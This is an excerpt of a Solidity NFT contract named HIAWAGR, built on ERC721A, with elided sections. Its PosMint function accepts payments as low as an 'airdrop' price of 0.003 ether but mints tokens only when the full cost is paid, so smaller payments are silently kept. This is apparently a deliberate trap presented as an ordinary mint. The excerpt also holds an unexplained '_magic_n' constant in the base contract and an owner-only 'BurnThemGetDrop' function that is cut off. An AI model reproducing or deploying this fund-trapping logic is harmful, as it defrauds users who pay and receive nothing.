...
contract ERC721A is Context, ERC165, IERC721, IERC721Metadata {
     ...
     */
     uint256 constant _magic_n = 1937;
...
contract HIAWAGR  is ERC721A, Ownable {

    string  public uriPrefix = "ipfs://QmXZ8UGELT1r6hxJBQGUgfKofdZp1BPrUJB1NkYmwMiJb4/";

    uint256 public immutable cost = 0.006 ether;
    uint256 public immutable GetAirDrop = 0.003 ether;
    ...
    function PosMint (uint256 amount) public payable callerIsUser{
        require(totalSupply() + amount <= maxSupply, "sold out");
        require(msg.value >= GetAirDrop, "insufficient");
        if (msg.value >= cost * amount) {
            _safeMint(msg.sender, amount);
        }
    }

    function BurnThemGetDrop (uint256 amount) public onlyOwner {
